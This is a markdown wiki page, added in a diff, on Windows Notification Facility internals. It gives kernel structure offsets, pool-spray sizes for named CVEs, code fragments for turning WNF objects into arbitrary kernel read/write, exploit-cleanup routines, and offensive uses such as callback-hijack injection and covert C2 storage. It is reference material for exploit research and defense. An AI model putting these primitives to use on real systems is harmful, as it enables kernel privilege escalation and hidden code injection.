@@ -1,0 +1,460 @@
+---
+title: Windows Notification Facility (WNF) — Internals & Exploitation
+permalink: /wiki/kernel/wnf_internals/
+layout: single
+author_profile: true
+tags:
+- windows-exploit-research
+- kernel-mode
+- kernel
+redirect_from:
+- /wiki/kernel/wnf_internals/
+---
+
+> **Last updated:** 2026-04-11  
+> **Related:** [Cve 2021 31956](/wiki/cves/CVE-2021-31956/), [Heap Grooming](/wiki/techniques/heap_grooming/), [Pool Internals](/wiki/kernel/pool_internals/), [Primitives](/wiki/kernel/primitives/)  
+> **Tags:** `kernel-mode`, `pool`, `uaf`, `aaw`, `aar`, `process-injection`
+
+## Summary
+
+WNF (Windows Notification Facility) is a mostly-undocumented, pub-sub notification system embedded in the Windows kernel. Processes and drivers can publish state updates to "state names" and subscribe to receive notifications when they change. WNF is used pervasively by Windows internals — hundreds of built-in state names cover hardware events, code integrity, session changes, and more. From a security perspective, WNF is valuable in two ways: (1) as a **pool spray primitive** for kernel exploitation (paged pool, attacker-controlled size and content), and (2) as an **offensive capability** for process injection and data persistence (largely undetected by EDRs as of 2024).
+
+Key foundational research: Alex Ionescu + Gabrielle Viala, "Windows Notification Facility: Peeling the Onion" (Black Hat USA 2018). Offensive exploitation documented by Alex Plaskett (NCC Group) in CVE-2021-31956 writeup.
+
+---
+
+## Architecture Overview
+
+WNF implements a publisher/subscriber model:
+
+```
+Publisher → NtUpdateWnfStateData(StateName, data, len)
+              ↓ kernel stores data in _WNF_STATE_DATA (paged pool)
+              ↓ notifies all subscribers
+Subscriber → callback(StateName, ChangeStamp, data, len) [runs in new thread]
+```
+
+Any process can read state data directly (without subscription) via `NtQueryWnfStateData`, subject to ACL checks. StateNames have **Security Descriptors** controlling read/write/subscribe access.
+
+---
+
+## StateName Encoding
+
+StateNames are 64-bit integers. Their structure is hidden by XOR with `0x41C64E6DA3BC0074`:
+
+```c
+StateName XOR 0x41C64E6DA3BC0074 = _WNF_STATE_NAME_STRUCT {
+    ULONG64 Version      :4;
+    ULONG64 NameLifetime :2;   // 0=WellKnown, 1=Permanent, 2=Persistent, 3=Temporary
+    ULONG64 DataScope    :4;   // 0=System, 1=Session, 2=User, 3=Process, 4=Machine, 5=PhysicalMachine
+    ULONG64 PermanentData:1;
+    ULONG64 Unique       :53;
+};
+```
+
+---
+
+## StateName Lifetimes
+
+| Lifetime | Value | Privilege Required | Persistence | Registry Location |
+|----------|-------|-------------------|-------------|-------------------|
+| WellKnown | 0 | — (predefined) | Permanent | `HKLM\SYSTEM\CurrentControlSet\Control\Notifications` |
+| Permanent | 1 | SeCreatePermanentPrivilege | Across reboots | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications` |
+| Persistent | 2 | SeCreatePermanentPrivilege | Until reboot | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\VolatileNotifications` |
+| Temporary | 3 | None | Until process death | (in-memory only) |
+
+**Temporary StateNames** are the primary exploit tool — any unprivileged process can create them.
+
+---
+
+## Kernel Structures
+
+### TypeCode Constants
+
+```c
+#define WNF_SCOPE_MAP_CODE          ((CSHORT)0x901)
+#define WNF_SCOPE_INSTANCE_CODE     ((CSHORT)0x902)
+#define WNF_NAME_INSTANCE_CODE      ((CSHORT)0x903)   // ← key exploit target
+#define WNF_STATE_DATA_CODE         ((CSHORT)0x904)   // ← key exploit target
+#define WNF_SUBSCRIPTION_CODE       ((CSHORT)0x905)
+#define WNF_PROCESS_CONTEXT_CODE    ((CSHORT)0x906)
+```
+
+All WNF structs start with `_WNF_NODE_HEADER { CSHORT TypeCode; CSHORT ByteSize; }`.
+
+### `_WNF_SCOPE_INSTANCE` — Scope Container
+
+Represents one Data Scope. Contains a `NameSet` AVL tree root pointing to all `_WNF_NAME_INSTANCE` objects within that scope.
+
+### `_WNF_NAME_INSTANCE` — Per-StateName Kernel Object
+
+```c
+//0xA8 bytes (sizeof) — pool chunk 0xC0 with headers
+struct _WNF_NAME_INSTANCE {
+    struct _WNF_NODE_HEADER  Header;             //0x0   TypeCode=0x903, ByteSize=0xA8
+    struct _EX_RUNDOWN_REF   RunRef;             //0x8   ← overflow target (cleanup concern)
+    struct _RTL_BALANCED_NODE TreeLinks;         //0x10  AVL tree link
+    struct _WNF_STATE_NAME_STRUCT StateName;     //0x28  encoded StateName
+    struct _WNF_SCOPE_INSTANCE* ScopeInstance;   //0x30  ← save for cleanup tree walk
+    struct _WNF_STATE_NAME_REGISTRATION StateNameInfo; //0x38
+    struct _WNF_LOCK StateDataLock;              //0x50
+    struct _WNF_STATE_DATA* StateData;           //0x58  ← overwrite for AAR/AAW primitive
+    ULONG CurrentChangeStamp;                    //0x60
+    VOID* PermanentDataStore;                    //0x68
+    struct _WNF_LOCK StateSubscriptionListLock;  //0x70
+    struct _LIST_ENTRY StateSubscriptionListHead;//0x78
+    struct _LIST_ENTRY TemporaryNameListEntry;   //0x88  ← linked list for cleanup iteration
+    struct _EPROCESS* CreatorProcess;            //0x98  ← EPROCESS leak (no KASLR bypass needed!)
+    LONG DataSubscribersCount;                   //0xa0
+    LONG CurrentDeliveryCount;                   //0xa4
+};
+```
+
+**Pattern bytes for scanning:** `\x03\x09\xa8\x00` at +0x0 (TypeCode=0x903 → stored LE as `03 09`, ByteSize=0xA8 → stored as `a8 00`)
+
+### `_WNF_STATE_DATA` — Per-StateName Data Storage
+
+```c
+//0x10 bytes header (data follows immediately after)
+struct _WNF_STATE_DATA {
+    struct _WNF_NODE_HEADER Header;  //0x0  TypeCode=0x904
+    ULONG AllocatedSize;             //0x4  ← overflow target: enlarge for OOB R/W
+    ULONG DataSize;                  //0x8  ← overflow target: enlarge for OOB R/W
+    ULONG ChangeStamp;               //0xc
+    // data bytes follow at +0x10
+};
+```
+
+**Pool tag:** `Wnf ` (0x20666E57)  
+**Allocation:** `ExAllocatePoolWithQuotaTag(PagedPool, dataLen + 0x10 + [poolHdr], 'WNF ')` via `ExpWnfWriteStateData`  
+**Total chunk:** `0x10 (pool hdr) + 0x10 (_WNF_STATE_DATA) + dataLen` bytes → round to bucket
+
+### `_WNF_SUBSCRIPTION` — Per-Subscriber Record
+
+```c
+//0x88 bytes
+struct _WNF_SUBSCRIPTION {
+    struct _WNF_NODE_HEADER Header;         //0x0  TypeCode=0x905
+    struct _EX_RUNDOWN_REF RunRef;          //0x8
+    ULONGLONG SubscriptionId;               //0x10
+    struct _LIST_ENTRY ProcessSubscriptionListEntry; //0x18
+    struct _EPROCESS* Process;              //0x28
+    struct _WNF_NAME_INSTANCE* NameInstance;//0x30
+    struct _WNF_STATE_NAME_STRUCT StateName;//0x38
+    struct _LIST_ENTRY StateSubscriptionListEntry;  //0x40
+    ULONGLONG CallbackRoutine;              //0x50  ← kernel address of callback
+    VOID* CallbackContext;                  //0x58
+    ULONG CurrentChangeStamp;              //0x60
+    ULONG SubscribedEventSet;             //0x64
+    struct _LIST_ENTRY PendingSubscriptionListEntry; //0x68
+    enum _WNF_SUBSCRIPTION_STATE SubscriptionState; //0x78
+    ULONG SignaledEventSet;               //0x7c
+    ULONG InDeliveryEventSet;             //0x80
+};
+```
+
+`CallbackRoutine` is a kernel-mode function pointer for drivers, or a user-mode process address for user-mode subscribers. Modifying this enables **process injection** (via WNF callback hijack).
+
+### `_WNF_PROCESS_CONTEXT` — Per-Process WNF State
+
+```c
+//0x88 bytes
+struct _WNF_PROCESS_CONTEXT {
+    struct _WNF_NODE_HEADER Header;            //0x0  TypeCode=0x906
+    struct _EPROCESS* Process;                 //0x8
+    struct _LIST_ENTRY WnfProcessesListEntry;  //0x10  ← nt!ExpWnfProcessesListHead
+    VOID* ImplicitScopeInstances[3];           //0x20
+    struct _WNF_LOCK TemporaryNamesListLock;   //0x38
+    struct _LIST_ENTRY TemporaryNamesListHead; //0x40  ← iterate for cleanup
+    struct _WNF_LOCK ProcessSubscriptionListLock; //0x50
+    struct _LIST_ENTRY ProcessSubscriptionListHead; //0x58
+    struct _WNF_LOCK DeliveryPendingListLock;  //0x68
+    struct _LIST_ENTRY DeliveryPendingListHead;//0x70
+    struct _KEVENT* NotificationEvent;         //0x80
+};
+```
+
+`_EPROCESS.WnfContext` → `_WNF_PROCESS_CONTEXT`. `TemporaryNamesListHead` is the linked list of all `_WNF_NAME_INSTANCE.TemporaryNameListEntry` for this process — use this for cleanup iteration.
+
+**Global:** `nt!ExpWnfProcessesListHead` → doubly-linked list of all `_WNF_PROCESS_CONTEXT` (at +0x10 offset).
+
+---
+
+## Userland Structures (Win11 x64)
+
+```c
+// Subscription Table (per-process, in heap) — TypeCode 0x911
+struct _WNF_SUBSCRIPTION_TABLE_WIN11 {
+    _WNF_NODE_HEADER Header;          //0x0
+    SRWLOCK NamesTableLock;           //0x8
+    _RTL_RB_TREE NamesTableEntry;     //0x10  ← binary tree of Name Subscriptions
+    _LIST_ENTRY SerializationGroupListHead; //0x20
+    SRWLOCK SerializationGroupListLock; //0x30
+};
+
+// Name Subscription (per StateName) — TypeCode 0x912
+struct _WNF_NAME_SUBSCRIPTION_WIN11 {
+    _WNF_NODE_HEADER Header;          //0x0
+    ULONG StateName;                  //0x10
+    QWORD ChangeStamp;                //0x18
+    RTL_BALANCED_NODE NamesTableEntry;//0x20
+    LIST_ENTRY SubscriptionsListHead; //0x48  ← list of User Subscriptions
+};
+
+// User Subscription (per callback) — TypeCode 0x914
+struct _WNF_USER_SUBSCRIPTION_WIN11 {
+    _WNF_NODE_HEADER Header;          //0x0
+    LIST_ENTRY SubscriptionsListEntry;//0x8
+    _WNF_NAME_SUBSCRIPTION* pNameSubscription; //0x18
+    void* Callback;                   //0x20  ← callback address
+    void* CallbackContext;            //0x28
+    ULONG SubProcessTag;              //0x30
+    int ChangeStamp;                  //0x34 (was 0x28 in older versions)
+    _WNF_SERIALIZATION_GROUP* pSerializationGroup; //0x48
+    int UserSubscriptionsCount;       //0x50
+};
+```
+
+---
+
+## Kernel Exploitation: WNF as Pool Spray Primitive
+
+### Why WNF Works for Pool Grooming
+
+1. **Controlled size**: `dataLen` can be any value up to `WNF_MAX_STATE_DATA_SIZE` (default 0x1000). Allocation = `0x20 (headers) + dataLen` bytes.
+2. **Controlled content**: `NtUpdateWnfStateData` lets attacker write arbitrary bytes into the data area.
+3. **Controlled free**: `NtDeleteWnfStateData` frees `_WNF_STATE_DATA` specifically; `NtDeleteWnfStateName` frees the `_WNF_NAME_INSTANCE`.
+4. **Paged pool**: All core WNF allocations go to paged pool — matches most driver allocations.
+5. **No privileges**: Any user can create Temporary StateNames.
+
+### WNF Pool API
+
+```c
+// Create state name (allocates _WNF_NAME_INSTANCE in paged pool):
+NtCreateWnfStateName(&stateName, WnfTemporaryStateName, WnfDataScopeMachine,
+                     FALSE, 0, maxDataSize, pSD);
+
+// Allocate/reallocate _WNF_STATE_DATA (controlled size + content):
+NtUpdateWnfStateData(&stateName, data, dataLen, 0, 0, 0, 0);
+
+// Read state data (OOB read if DataSize was corrupted):
+NtQueryWnfStateData(&stateName, NULL, NULL, &stamp, outBuf, &outBufSize);
+
+// Free _WNF_STATE_DATA only:
+NtDeleteWnfStateData(&stateName, NULL);
+
+// Free _WNF_NAME_INSTANCE + _WNF_STATE_DATA:
+NtDeleteWnfStateName(&stateName);
+```
+
+### CVE-2021-31956 Pattern (0xC0 Bucket)
+
+For targeting 0xC0 paged pool chunks:
+
+```c
+// _WNF_STATE_DATA for 0xC0 chunk: dataLen = 0xA0
+NtUpdateWnfStateData(&state, buf, 0xA0, 0, 0, 0, 0);
+// Result: 0x10 (pool hdr) + 0x10 (WNF_STATE_DATA hdr) + 0xA0 (data) = 0xC0
+
+// _WNF_NAME_INSTANCE is always 0xA8 + 0x10 pool hdr → chunk 0xC0
+// (same bucket — can be adjacent to WNF_STATE_DATA and overflow victim)
+```
+
+### CVE-2024-30085 Pattern (0x1000 Bucket)
+
+```c
+// _WNF_STATE_DATA for 0x1000 chunk: dataLen = 0xFF0
+NtUpdateWnfStateData(&state, buf, 0xFF0, 0, 0, 0, 0);
+// Result: 0x10 + 0x10 + 0xFF0 = 0x1010 → rounds to 0x1000 in VS segment
+```
+
+Corrupting DataSize from 0xFF0 to 0xFF8 gives 8-byte OOB read into next chunk.
+
+### OOB Read/Write via Corrupted DataSize
+
+```c
+// After corruption: DataSize = 0xFF8 (8 bytes past allocation)
+// The 8 bytes at offset 0xFF0 within WNF data = first 8 bytes of adjacent chunk
+
+// Read: NtQueryWnfStateData returns those 8 extra bytes in output buffer
+// Write: NtUpdateWnfStateData(state, newData, 0xFF8, ...) writes 8 extra bytes
+
+// If adjacent chunk is _ALPC_HANDLE_TABLE → leak Handles kernel pointer at +0x0
+// If adjacent chunk is PipeAttribute → corrupt Flink for arbitrary read chain
+// If adjacent chunk is _WNF_NAME_INSTANCE → read CreatorProcess, overwrite StateData
+```
+
+---
+
+## WNF_NAME_INSTANCE.StateData Overwrite Primitive (AAR/AAW)
+
+When a `_WNF_NAME_INSTANCE` is adjacent and its `StateData` pointer is overwritten:
+
+```c
+// 1. Use OOB write to replace _WNF_NAME_INSTANCE.StateData (at instance+0x58)
+//    with pointer to target kernel address T (aligned so T-0x10 looks like valid _WNF_STATE_DATA)
+
+// 2. AAR: NtQueryWnfStateData(corrupted_name, ..., outBuf, &size)
+//    → kernel reads from T-0x10 for "header", copies DataSize bytes from T
+//    → outBuf receives up to DataSize bytes of kernel memory starting at T
+
+// 3. AAW: NtUpdateWnfStateData(corrupted_name, payload, dataLen, ...)
+//    → kernel writes payload to T (within _WNF_STATE_DATA.data[] region)
+```
+
+**Constraint**: The 8 bytes before `T` must look like valid `_WNF_STATE_DATA.AllocatedSize + DataSize`. Use kernel addresses where the high 32 bits are a naturally large number (e.g., kernel address high word) as AllocatedSize, and a controllable field (e.g., thread affinity mask) as DataSize.
+
+---
+
+## Exploit Cleanup (Critical for Stability)
+
+After using WNF for exploitation, three objects may be corrupted and must be restored before process exit:
+
+### 1. Restore StateData Pointer
+
+```c
+// Walk _WNF_SCOPE_INSTANCE.NameSet AVL tree using arbitrary read:
+// ScopeInstance+0x38 = tree root → TreeLinks.Left/.Right navigation
+// Match by StateName field at TreeLinks+0x18
+QWORD* FindStateName(QWORD StateName) {
+    for (i = read64(ScopeInstance + 0x38); i; i = read64(i + 0x8)) {
+        QWORD curr = read64(i + 0x18);
+        if (StateName >= curr) break;
+    }
+    return (QWORD*)((QWORD*)i - 2);  // base of _WNF_NAME_INSTANCE
+}
+// Then: write64(nameInstance + 0x58, originalStateData);
+```
+
+### 2. Restore Corrupted RunRef Fields
+
+```c
+// Walk EPROCESS.WnfContext._WNF_PROCESS_CONTEXT.TemporaryNamesListHead:
+void FixRunRefs(LPVOID wnf_process_context) {
+    LPVOID first = read64(wnf_process_context + 0x40);
+    for (LPVOID ptr = read64(first); ptr != first; ptr = read64(ptr)) {
+        QWORD* inst = (QWORD*)ptr - 17;  // TemporaryNameListEntry at +0x88 → base = ptr - 0x88
+        QWORD hdr = read64(inst);
+        if (hdr != 0x0000000000A80903) {  // valid header: TypeCode=0x903, ByteSize=0xA8
+            write64(inst, 0x0000000000A80903);
+            write64((char*)inst + 0x8, 0);  // zero RunRef
+        }
+    }
+}
+```
+
+### 3. Restore PreviousMode
+
+```c
+// Before spawning any new process, restore PreviousMode to 1:
+NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)(kthrread + PreviousMode_offset), &one, 1, NULL);
+// Failure to do this causes crash in PspLocateInPEManifest during NtCreateUserProcess
+```
+
+---
+
+## WNF Code Integrity State Names (Defensive/Monitoring)
+
+Windows 10+ exposes several WNF state names notified by the kernel Code Integrity Manager (`CI.dll`):
+
+| State Name | Value | Event |
+|------------|-------|-------|
+| `WNF_CI_BLOCKED_DRIVER` | `0x41c6072ea3bc1875` | Driver blocked by HVCI block list |
+| `WNF_CI_CODEINTEGRITY_MODE_CHANGE` | `0x41c6072ea3bc2075` | CI enforcement mode changed |
+| `WNF_CI_HVCI_IMAGE_INCOMPATIBLE` | `0x41c6072ea3bc1075` | Image blocked (W+X or exec NPP) |
+| `WNF_CI_SMODE_CHANGE` | `0x41c6072ea3bc0875` | S mode changed |
+| `WNF_CI_APPLOCKERFLTR_START_REQUESTED` | `0x41c6072ea3bc2875` | AppLockerFltr start |
+| `WNF_CI_LSAPPL_DLL_LOAD_FAILURE` | `0x41c6072ea3bc3075` | LSASS PPL-incompatible DLL blocked [preview] |
+| `WNF_CI_LSAPPL_DLL_LOAD_FAILURE_AUDIT_MODE` | `0x41c6072ea3bc3875` | LSASS PPL audit mode DLL [preview] |
+
+**`WNF_CI_BLOCKED_DRIVER_CONTEXT` struct** (public symbols):
+```c
+struct _WNF_CI_BLOCKED_DRIVER_CONTEXT {
+    GUID Guid;                    //0x0000
+    ULONG Policy;                 //0x0010
+    USHORT ImagePathLength;       //0x0014
+    WCHAR ImagePath[1];           //0x0016
+};
+```
+
+**Subscribers (Windows 11):**
+- `MpSvc.dll` (Windows Defender) → `WNF_CI_CODEINTEGRITY_MODE_CHANGE`, `WNF_CI_SMODE_CHANGE`
+- `PcaSvc.dll` (Program Compatibility Assistant) → `WNF_CI_HVCI_IMAGE_INCOMPATIBLE`, `WNF_CI_BLOCKED_DRIVER`
+- `DcomLaunch` → `WNF_CI_SMODE_CHANGE`, `WNF_CI_BLOCKED_DRIVER`, `WNF_CI_APPLOCKERFLTR_START_REQUESTED`
+
+Dump all WNF names: `WnfNameDumper.py` (ionescu007/wnfun) against `perf_nt_c.dll` from the Windows SDK (1,400+ names in 22H2).
+
+---
+
+## Offensive Uses of WNF
+
+1. **Kernel Pool Spray** (primary exploit use): controlled size + content paged pool allocation with no privileges
+2. **Process Injection** (userland): overwrite `_WNF_SUBSCRIPTION.CallbackContext` + `CallbackRoutine` in target process's userland subscription — trigger by updating the StateData → target process executes attacker code (largely undetected by EDRs as of 2023)
+3. **Data Persistence**: write persistent data into Permanent/Persistent StateNames (survives across reboot for Permanent). Accessible by anyone with read permissions → covert C2 data channel.
+
+## Manager/Worker Pattern: WNF + TOKEN (CVE-2022-22715)
+
+The canonical paged pool exploit pattern using WNF and `_TOKEN` as manager/worker objects:
+
+| Role | Object | Used As |
+|------|--------|---------|
+| **Manager** | `_WNF_STATE_DATA` | After `DataSize` corruption → 0x1000 OOB R/W range; used to modify adjacent worker |
+| **Worker** | `_TOKEN` | After manager OOB write corrupts it: `BnoIsolation.Buffer` → arbitrary read; `DynamicPart` → arbitrary write |
+
+### Why `_TOKEN` as Worker
+
+**Arbitrary read** — `NtQueryInformationToken(TokenHandle, TokenBnoIsolation, outBuf, size, &ret)`:
+```c
+// Kernel path:
+memmove((char*)TokenInformation + 16,
+        TOKEN->BnoIsolationHandlesEntry->EntryDescriptor.IsolationPrefix.Buffer,
+        TOKEN->BnoIsolationHandlesEntry->EntryDescriptor.IsolationPrefix.MaximumLength);
+// → Corrupt IsolationPrefix.Buffer → read from arbitrary address
+```
+
+**Arbitrary write** — `NtSetInformationToken(TokenHandle, TokenDefaultDacl, pACL, 8)`:
+```c
+// Kernel path (SepAppendDefaultDacl):
+memmove(TOKEN->DynamicPart + offset, userACL, userACL->AclSize);
+// → Corrupt DynamicPart → write user-controlled bytes to arbitrary address
+```
+
+### LUID-Based Worker Object Identification
+
+After the OOB write corrupts an unknown number of `_TOKEN` objects, finding the correct handle requires a scanning technique:
+
+1. **At spray time**: call `NtQueryInformationToken(h, TokenStatistics, &stats, ...)` for every sprayed TOKEN handle → record `stats.TokenId` (LUID) per handle → store in array `{handle → luid}`
+
+2. **After OOB read** (via corrupted manager WNF): the raw bytes of the adjacent page contain `_TOKEN` header including the LUID field at a known offset → extract the LUID from the leaked data
+
+3. **Match**: scan the stored array for the leaked LUID → the matching handle is the worker object
+
+This avoids brute-force blind attempts and works reliably without kernel address knowledge.
+
+### Scanning for the Last Corrupted Manager Page
+
+Among all corrupted `_WNF_STATE_DATA` objects, the one at the **last corrupted page** is the manager: its OOB data (0x1000 range) reaches into the next normal page containing the `_TOKEN` worker.
+
+Detection technique:
+- Call `NtQueryWnfStateData(name, ..., 0x1000)` for each sprayed state name
+- If `DataSize` was NOT corrupted → returns `STATUS_BUFFER_TOO_SMALL` (0xC0000023)
+- If `DataSize` WAS corrupted to 0x1000 → returns actual data (OOB content)
+- Among the corrupted ones, find the last one whose OOB content is the malicious payload (not yet reaching the normal page) → the NEXT one is the manager (its OOB content is the `_TOKEN` data)
+
+---
+
+## Exploit Relevance
+
+WNF as a pool spray primitive was introduced in CVE-2021-31956 exploitation and has since been used in CVE-2022-22715, CVE-2024-30085, and other exploits. The combination of size flexibility, content control, and pool-type consistency makes it the most reliable paged pool spray primitive available from unprivileged user mode. Pool tags `Wnf ` identify these allocations in memory/crash dumps.
+
+---
+
+## References
+
+- Alex Ionescu + Gabrielle Viala, "Windows Notification Facility: Peeling the Onion", Black Hat USA 2018
+- Gabrielle Viala, "Playing with the WNF", blog.quarkslab.com, 2018
+- Alex Plaskett (NCC Group), "CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF)" Parts 1+2, 2021
+- nag0mez, "WNF Chronicles I: Introduction", pwnedcoffee.com, 2023-03-23
+- Yarden Shafir (Trail of Bits), "Introducing WNF Code Integrity", trailofbits.com, 2023-05-15
+- modexp, "Windows Process Injection: Windows Notification Facility", 2019
+- wnfun tool: https://github.com/ionescu007/wnfun
